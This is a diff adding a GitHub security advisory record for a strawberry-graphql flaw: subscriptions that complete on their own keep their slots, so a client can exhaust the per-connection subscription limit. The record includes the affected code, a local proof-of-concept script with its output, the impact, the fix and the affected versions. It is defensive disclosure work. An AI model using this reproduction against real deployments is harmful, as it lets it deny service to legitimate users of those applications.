@@ -1,0 +1,109 @@
+{
+  "id": "GHSA-m952-2w3f-6r8h",
+  "modified": "2026-10-09T14:15:05.395201388Z",
+  "published": "2026-10-09T14:07:20Z",
+  "aliases": [
+    "CVE-2026-107727"
+  ],
+  "summary": "Strawberry legacy graphql-ws retains naturally completed subscription slots",
+  "details": "### Summary\n\nStrawberry's legacy `graphql-ws` subscription handler can retain task and subscription bookkeeping after a one-shot subscription has naturally sent its `complete` message. When the application configures `max_subscriptions_per_connection`, the handler counts those completed operations in `len(self.tasks)`. A client that uses distinct operation IDs can therefore reach the configured subscription limit even though the earlier subscriptions have already completed, causing subsequent legitimate subscriptions on the same persistent WebSocket connection to receive `Subscription limit reached`.\n\nThis is a conditional connection-level availability and resource-accounting issue. It requires explicit use of the legacy `graphql-ws` protocol, a persistent WebSocket connection, one-shot subscriptions that naturally complete, and a configured `max_subscriptions_per_connection` limit. It is not an unconditional issue in a default Strawberry installation and is distinct from the previously fixed single-connection infinite-subscription issue.\n\n### Details\n\nThe audited snapshot is Strawberry `0.324.4`, commit `c3caabd1188acda62045e7fd9ba9e37ac430cf96`. The relevant implementation is in [`[strawberry/subscriptions/protocols/graphql_ws/handlers.py](https://github.com/strawberry-graphql/strawberry/blob/c3caabd1188acda62045e7fd9ba9e37ac430cf96/strawberry/subscriptions/protocols/graphql_ws/handlers.py)`](https://github.com/strawberry-graphql/strawberry/blob/c3caabd1188acda62045e7fd9ba9e37ac430cf96/strawberry/subscriptions/protocols/graphql_ws/handlers.py), particularly the operation-start, result-handling, and cleanup paths.\n\nWhen a new operation is started, the handler rejects it once the task count reaches the configured limit:\n\n```python\nif (\n    self.max_subscriptions_per_connection is not None\n    and len(self.tasks) \u003e= self.max_subscriptions_per_connection\n):\n    await self.send_message(\n        ErrorMessage(\n            type=\"error\",\n            id=operation_id,\n            payload={\"message\": \"Subscription limit reached\"},\n        )\n    )\n    return\n```\n\nThe operation task is stored in `self.tasks`, and its result source is stored in `self.subscriptions`. On normal exhaustion of the result source, `handle_async_results()` sends a completion message:\n\n```python\nasync for result in result_source:\n    await self.send_data_message(result, operation_id)\n\nawait self.send_message(\n    CompleteMessage(type=\"complete\", id=operation_id)\n)\n```\n\nThe natural completion path does not call `cleanup_operation()` before returning. The deletion of the stored operation state is implemented separately:\n\n```python\nasync def cleanup_operation(self, operation_id: str) -\u003e None:\n    if operation_id in self.subscriptions:\n        await self.subscriptions[operation_id].aclose()\n        del self.subscriptions[operation_id]\n\n    self.tasks[operation_id].cancel()\n    await self.tasks[operation_id]\n    del self.tasks[operation_id]\n```\n\nConsequently, after a one-shot operation has sent `complete`, its task entry can remain in `self.tasks` until the client explicitly stops the operation, reuses the same operation ID, or the connection is cleaned up. New operation IDs are compared against the retained task count and can be rejected.\n\nThe connection-slot impact requires both parts of the behavior:\n\n1. the natural-completion path leaves the completed operation accounted for; and\n2. the legacy handler has `max_subscriptions_per_connection` enabled.\n\n### PoC\n\nThe following reproduction is local-only and bounded. It uses an in-memory Channels WebSocket fixture, one connection, three one-shot subscriptions, and the legacy `graphql-ws` subprotocol. It does not connect to a public endpoint or start a network service.\n\n#### 1. Environment installation\n\nCreate an isolated virtual environment and install the official Channels integration extra together with the local ASGI test dependency:\n\n```bash\npython -m pip install \"strawberry-graphql[channels]==0.324.4\" daphne\n```\n\nFor a different tested release, replace `0.324.4` and record the actual installed version. The test uses an in-memory Channels communicator and does not connect to a real server.\n\nRecord the actual versions before testing:\n\n```bash\npython -c \"import sys, importlib.metadata as m; print(sys.version); print('strawberry-graphql:', m.version('strawberry-graphql')); print('channels:', m.version('channels')); print('Django:', m.version('Django')); print('asgiref:', m.version('asgiref'))\"\n```\n\n#### 2. Save the bounded test\n\nSave the following as `poc.py`:\n\n```python\nimport asyncio\n\nfrom django.conf import settings\n\nif not settings.configured:\n    settings.configure(\n        SECRET_KEY=\"local-validation-only\",\n        CHANNEL_LAYERS={\n            \"default\": {\n                \"BACKEND\": \"channels.layers.InMemoryChannelLayer\",\n            }\n        },\n    )\n\nimport strawberry\nfrom channels.testing import WebsocketCommunicator\n\nfrom strawberry.channels.handlers.ws_handler import GraphQLWSConsumer\nfrom strawberry.schema import Schema\nfrom strawberry.subscriptions import GRAPHQL_WS_PROTOCOL\n\n\n@strawberry.type\nclass Query:\n    @strawberry.field\n    def ping(self) -\u003e str:\n        return \"pong\"\n\n\n@strawberry.type\nclass Subscription:\n    @strawberry.subscription\n    async def one_shot(self) -\u003e str:\n        yield \"marker\"\n\n\nschema = Schema(query=Query, subscription=Subscription)\n\napplication = GraphQLWSConsumer.as_asgi(\n    schema=schema,\n    subscription_protocols=(GRAPHQL_WS_PROTOCOL,),\n    max_subscriptions_per_connection=2,\n)\n\n\nasync def receive_until_complete(communicator, operation_id):\n    messages = []\n    for _ in range(3):\n        message = await asyncio.wait_for(\n            communicator.receive_json_from(), timeout=2\n        )\n        messages.append(message)\n        if (\n            message.get(\"type\") == \"complete\"\n            and message.get(\"id\") == operation_id\n        ):\n            return messages\n    raise AssertionError(\n        f\"no complete message for {operation_id}: {messages}\"\n    )\n\n\nasync def main() -\u003e None:\n    communicator = WebsocketCommunicator(\n        application,\n        \"/graphql\",\n        subprotocols=[GRAPHQL_WS_PROTOCOL],\n    )\n    connected, accepted_protocol = await communicator.connect()\n    assert connected\n    assert accepted_protocol == GRAPHQL_WS_PROTOCOL\n\n    try:\n        await communicator.send_json_to({\"type\": \"connection_init\"})\n        ack = await communicator.receive_json_from()\n        assert ack[\"type\"] == \"connection_ack\"\n\n        query = \"subscription { oneShot }\"\n\n        await communicator.send_json_to(\n            {\n                \"type\": \"start\",\n                \"id\": \"one\",\n                \"payload\": {\"query\": query},\n            }\n        )\n        first_messages = await receive_until_complete(\n            communicator, \"one\"\n        )\n\n        await communicator.send_json_to(\n            {\n                \"type\": \"start\",\n                \"id\": \"two\",\n                \"payload\": {\"query\": query},\n            }\n        )\n        second_messages = await receive_until_complete(\n            communicator, \"two\"\n        )\n\n        # Allow completed handler tasks to finish their sends before the\n        # third operation is started.\n        await asyncio.sleep(0)\n\n        await communicator.send_json_to(\n            {\n                \"type\": \"start\",\n                \"id\": \"three\",\n                \"payload\": {\"query\": query},\n            }\n        )\n        third_message = await asyncio.wait_for(\n            communicator.receive_json_from(), timeout=2\n        )\n\n        print(\n            {\n                \"first\": first_messages,\n                \"second\": second_messages,\n                \"third\": third_message,\n            }\n        )\n    finally:\n        await communicator.disconnect()\n\n\nasyncio.run(main())\n```\n\n#### 3. Run\n\n```bash\npython poc.py\n```\n\n#### 4. Expected results\n\nA fixed implementation should send `data` and `complete` for both `one` and `two`, then permit `three` to start and complete.\n\nThe behavior is:\n\n```text\n{\n  'first': [\n    {'type': 'data', 'id': 'one', 'payload': {'data': {'oneShot': 'marker'}}},\n    {'type': 'complete', 'id': 'one'}\n  ],\n  'second': [\n    {'type': 'data', 'id': 'two', 'payload': {'data': {'oneShot': 'marker'}}},\n    {'type': 'complete', 'id': 'two'}\n  ],\n  'third': {\n    'type': 'error',\n    'id': 'three',\n    'payload': {'message': 'Subscription limit reached'}\n  }\n}\n```\n\nThe exact formatting and fields may vary slightly by Strawberry version, but the decisive observation is that `one` and `two` both receive `complete`, while `three` receives `Subscription limit reached` with a different operation ID.\n\n\n## Impact\n\nWhen the legacy `graphql-ws` protocol and `max_subscriptions_per_connection` are enabled, a client can fill the configured operation slots on its persistent connection with one-shot subscriptions that have already completed. Subsequent legitimate operations on that connection may be rejected even though no corresponding subscriptions remain active.\n\nThe primary demonstrated impact is connection-level availability and incorrect resource accounting. Multiple long-lived connections could increase the amount of retained task/subscription state, but this bounded test does not establish memory exhaustion or cross-connection denial of service.\n\nExposure depends on:\n\n- the application explicitly enabling the legacy `graphql-ws` protocol;\n- the application configuring `max_subscriptions_per_connection`;\n- clients being able to maintain a persistent WebSocket connection;\n- the resolver exposing a finite operation that naturally completes;\n- the absence of effective connection lifetime, connection-count, authorization, or rate limits.\n\nThis report does not claim impact on the modern `graphql-transport-ws` protocol, on applications without the per-connection cap, or on every deployment. It is distinct from the already fixed unlimited-subscription behavior.\n\n### Maintainer note\n\nConfirmed and reproduced against 0.327.0. The `max_subscriptions_per_connection` feature this affects was introduced in 0.312.3 (#4344), so the affected range is \u003e= 0.312.3, \u003c= 0.327.0.\n\nFixed by https://github.com/strawberry-graphql/strawberry/pull/4610: operations now release their slot when they complete on their own or fail before execution, and a late `stop` for a completed operation is a no-op. The fix was released in 0.327.2.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "strawberry-graphql",
+        "purl": "pkg:pypi/strawberry-graphql"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0.312.3"
+            },
+            {
+              "fixed": "0.327.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.312.3",
+        "0.312.4",
+        "0.313.0",
+        "0.314.0",
+        "0.314.1",
+        "0.314.2",
+        "0.314.3",
+        "0.315.0",
+        "0.315.1",
+        "0.315.2",
+        "0.315.3",
+        "0.315.4",
+        "0.315.5",
+        "0.315.6",
+        "0.315.7",
+        "0.316.0",
+        "0.317.0",
+        "0.317.1",
+        "0.317.2",
+        "0.318.0",
+        "0.318.1",
+        "0.319.0",
+        "0.320.0",
+        "0.320.1",
+        "0.320.2",
+        "0.320.3",
+        "0.320.4",
+        "0.321.0",
+        "0.321.1",
+        "0.322.0",
+        "0.322.1",
+        "0.322.2",
+        "0.323.0",
+        "0.323.1",
+        "0.323.2",
+        "0.324.0",
+        "0.324.1",
+        "0.324.2",
+        "0.324.3",
+        "0.324.4",
+        "0.324.5",
+        "0.325.0",
+        "0.326.0",
+        "0.326.1",
+        "0.327.0",
+        "0.327.1"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-m952-2w3f-6r8h/GHSA-m952-2w3f-6r8h.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/strawberry-graphql/strawberry/security/advisories/GHSA-m952-2w3f-6r8h"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-107727"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/strawberry-graphql/strawberry/pull/4610"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/strawberry-graphql/strawberry/commit/24c5e46d57f7ad4f77e6e01fb8ae482dd1c0ff92"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/strawberry-graphql/strawberry"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/strawberry-graphql/strawberry/releases/tag/0.327.2"
+    }
+  ]
+}
